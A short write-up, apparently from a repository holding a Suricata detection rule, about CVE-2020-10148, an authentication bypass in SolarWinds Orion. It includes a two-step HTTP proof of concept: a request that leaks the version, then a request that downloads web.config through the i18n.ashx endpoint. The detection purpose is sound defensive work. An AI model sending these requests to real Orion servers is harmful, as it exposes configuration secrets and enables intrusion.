## Overview
CVE-2020-10148 is an authentication bypass on SolarWinds Orion Platform. It just allows access to API without authenticating if users supply some specific strings on the URL. Attackers could exploit this vulnerability to abuse the API, which leads to remote code execution.

In my opinion, it looks like a basic CTF with something likes "admin=True" will give you admin access without logging in.

I write the Suricata rule to map to the mitigation provided by SolarWinds. Currently, there is only a local file disclosure PoC of this vulnerability. First, the attacker makes a request to the path "/Orion/invalid.aspx.js" to get the version. Afterward, he can use this version as a parameter to download arbitrary files with the "i18n.ashx" endpoint.

## Proof of Concept
* Leak version
```
GET /Orion/invalid.aspx.js HTTP/1.1
Host: example.com
```
* Download file
```
GET /web.config.i18n.ashx?l=en-US&v=42493.68 HTTP/1.1
Host: example.com
```
